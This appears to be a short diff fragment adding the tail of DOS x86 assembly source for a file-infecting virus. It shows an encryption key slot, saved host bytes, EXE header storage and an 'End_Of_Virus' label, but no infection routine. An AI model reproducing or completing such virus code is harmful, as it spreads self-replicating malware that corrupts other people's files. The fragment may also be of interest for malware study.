+Key_5003			dw	0   ; Encryption key 1
+dumb_end:
+
+;===================================================================
+; The heap is used here for storing some variables, and it is used
+; as a stack when the host is an EXE.
+;===================================================================
+
+Saved_DS equ	$
+f_attr  equ Saved_DS+2
+NewDelta equ f_attr+2
+BeginHhost3 equ NewDelta+2
+SavedFirstBytes equ BeginHhost3+3
+SavedEndBytes	equ	SavedFirstBytes+3
+ExeHeader	equ	SavedEndBytes+2
+StartOfStack equ ExeHeader+1ch*2
+End_Of_Stack equ StartOfStack + 100h
+End_Of_Virus:
+end     start
